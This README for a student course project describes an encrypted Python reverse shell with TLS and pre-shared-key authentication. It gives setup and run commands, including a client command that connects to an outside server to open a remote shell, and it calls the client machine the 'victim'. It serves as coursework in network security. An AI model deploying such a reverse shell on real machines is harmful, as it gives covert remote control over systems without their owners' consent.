# Wireless Systems Security final project

*Authors: Pau de las Heras and Eric Roy*

*This is the final project of the Wireless Systems Security course from
the ML and Cybersecurity for Internet-Connected Systems MSc at EPSEM-UPC*

**Disclaimer:** this code is published under the MIT license and only for
educational purposes. We are not responsible for any unethical usage of these
scripts.

---

## Outline

We enhance an existing [reverse shell application](https://github.com/frezazadeh/Security-Course-Labs/tree/main/Lab1-Reverse-shell)
by integrating critical security measures like TLS encryption and authentication.

## Features

This is a reverse shell that works over TLS, where the server is authenticated
by the client using a self-signed certificate (which the client has the
public key, otherwise it would be useless), and the client is authenticated
by the server using a pre-shared key (PSK).
Only one client can be connected at a time.

## Usage

**Requirements:** modern version of Python 3. Only builtin modules are used.

### Server-side

On your server (a machine which the victim/client can connect to) you need to
create a self-signed certificate:
```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

Then you can run the server:
```
python3 server.py
```

### Client-side

On the client machine, copy *only* the `client.py` file and `cert.pem` (since
copying the rest would lead to the client knowing server keys). Run:
```
python3 client.py
```

### Parameterize

Default values are used everywhere, but you can tweak them as much as you
want. For example:

```
python3 server.py --port 5555 --certificate-path /home/user/file.crt --password 123456789
python3 client.py --server asi.ericroy.net --port 5555 --password 123456789 --public-key-path /home/user/file.pub
```

<!-- REQUIREMENTS
SSL/TLS Encryption:
    Use Python’s ssl module to wrap the sockets.
    Generate or manage self-signed certificates.
    Ensure that data in transit is encrypted and secure.

Authentication Mechanism:
    Implement a method (e.g., password-based, challenge-response, or public/private key pairs) to validate connecting clients.
    Integrate the authentication process immediately after the SSL/TLS handshake and before any shell commands are executed.
-->
<!--
You must share the GitHub link to your project, ensuring that the code is fully commented and includes a complete README section.
In addition, you should provide a link to a demo video where you explain, step by step, the scenario, the problem, your code, and the final execution.
If you are working in a team, each team member must explain a specific part of the project in the video.
-->
